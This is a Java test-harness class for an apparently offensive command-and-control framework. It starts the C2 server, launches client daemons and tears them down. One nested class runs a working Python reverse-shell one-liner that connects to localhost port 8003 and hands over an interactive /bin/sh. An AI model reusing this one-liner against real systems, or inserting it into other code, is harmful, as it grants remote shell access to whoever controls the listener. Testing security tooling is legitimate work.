package util.test;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import c2.Constants;
import c2.session.CommandLoader;
import c2.session.IOManager;
import c2.session.log.IOLogger;
import util.Time;
import util.test.TestConfiguration.OS;

public class ClientServerTest {

	protected static ExecutorService service;
	protected static ServerRunner runner;
	protected static List<ChildManager> childManagers = new ArrayList<>();
	
	public static final String DEFAULT_SERVER_CONFIG = "test.properties";
	
	public static Path getDefaultConfigPath() {
		Path testPath = null;
		if (TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
			testPath = Paths.get("config", "test.properties");
		} else {
			testPath = Paths.get("config", "test_linux.properties");
		}
		return testPath;
	}
	
	public static IOManager setupDefaultIOManager() {
		try (InputStream input = new FileInputStream(ClientServerTest.getDefaultConfigPath().toFile())) {

			Properties prop = new Properties();

			// load a properties file
			prop.load(input);

			CommandLoader cl = new CommandLoader(new HashMap<>(), new HashMap<>(), new ArrayList<>());
			return new IOManager(new IOLogger(Paths.get(prop.getProperty(Constants.HUBLOGGINGPATH))), cl);

			
		} catch (IOException ex) {
			System.out.println("Unable to load config file");
			return null;
		}
	}
	
	public static Properties getDefaultSystemTestProperties() {
		try (InputStream input = new FileInputStream(ClientServerTest.getDefaultConfigPath().toFile())) {
			Properties prop = new Properties();
			prop.load(input);
			return prop;
		} catch (IOException ex) {
			System.out.println("Unable to load config file");
			return null;
		}
	}
	
	protected static void initiateServer() {
		if (System.getProperty("os.name").contains("Windows")) {
			initiateServer("test.properties");
		} else {
			initiateServer("test_linux.properties");
		}
	}
	
	protected static void initiateServer(String propName) {
		service = Executors.newFixedThreadPool(4);
		
		TestCommons.pretestCleanup();
		runner = new ServerRunner(propName);
		service.submit(runner);
		runner.main.awaitFullStartup();
	}
	
	public static class ChildManager implements Runnable {
		private String clientStartArgs;
		protected Process process = null;
			
		public ChildManager(String clientStartArgs) {
			this.clientStartArgs = clientStartArgs;
		}
		
		@Override
		public void run() {
			try {
				process = Runtime.getRuntime()
						.exec(clientStartArgs);
				process.waitFor();
			} catch (IOException | InterruptedException e) {
				e.printStackTrace();
			}

		}
		
		public void awaitProcess() {
			if(process != null) {
				try {
					process.waitFor();
				} catch (InterruptedException e) {
				}
			}
		}
		
		//Kills the process if alive, returns true if process still existed
		public boolean killProcess() {
			if(process == null) {
				//No process to kill
				return false;
			}
			try {
				process.exitValue();
				return false;
			}catch(IllegalThreadStateException ex) {
				process.destroyForcibly();
				return true;
			}
		}
	}
	
	public static class PythonChildManager extends ChildManager{

		public PythonChildManager() {
			super("");
		}
		
		@Override
		public void run(){
			String[] command = {"python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"localhost\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);"};
			
			try {
				process = Runtime.getRuntime().exec(command);
				process.waitFor();
				//System.out.println(new String(process.getErrorStream().readAllBytes()));
				//System.out.println(new String(process.getInputStream().readAllBytes()));
			} catch (IOException | InterruptedException e) {
				e.printStackTrace();
			}

		}
	}
	
	protected static void spawnPythonOneliner() {
		PythonChildManager pcm = new PythonChildManager();
		service.submit(pcm);
		childManagers.add(pcm);
		Time.sleepWrapped(3000);
	}
	
	protected static void spawnClient(String clientStartArgs) {
		ChildManager childManager = new ChildManager(clientStartArgs);
		
		service.submit(childManager);
		childManagers.add(childManager);
		//Give time for the daemons to make contact, especially important for SMB
		Time.sleepWrapped(3000);
	}
	
	protected static void awaitClient() {
		for(ChildManager childManager : childManagers) {
			childManager.awaitProcess();
		}
	}
	
	protected static void teardown() {
		if(service != null && runner != null) {
			service.shutdownNow();
			runner.main.awaitFullShutdown();
		}
		
		RunnerTestGeneric.cleanLogs();
		for(ChildManager manager : childManagers) {
			if(manager.killProcess()) {
				System.out.println("Warning: Had to kill: " + manager.clientStartArgs);
			}
		}
		Time.sleepWrapped(5000);//This is a hack b/c for some reason the server won't release resources here.
	}
	
	protected static void cleanupClients() {
		for(ChildManager manager : childManagers) {
			if(manager.killProcess()) {
				System.out.println("Warning: Had to kill: " + manager.clientStartArgs);
			}
		}
	}
	
	protected static void executeStandardTest(String daemonLaunchArg, TestConfiguration config) {
		initiateServer();
		spawnClient(daemonLaunchArg);
		RunnerTestGeneric.test(config);
		awaitClient();
		teardown();
	}
}
